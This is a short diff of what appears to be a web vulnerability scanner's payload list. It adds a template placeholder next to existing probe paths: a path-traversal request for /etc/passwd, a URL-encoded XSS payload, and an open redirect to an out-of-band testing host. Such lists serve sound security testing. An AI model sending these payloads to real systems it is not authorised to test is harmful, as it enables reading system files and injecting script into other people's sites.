@@ -12,3 +12,4 @@
 /viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd
 /index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /api.php?action=logout&forward=http://interact.sh
+{{paths}}
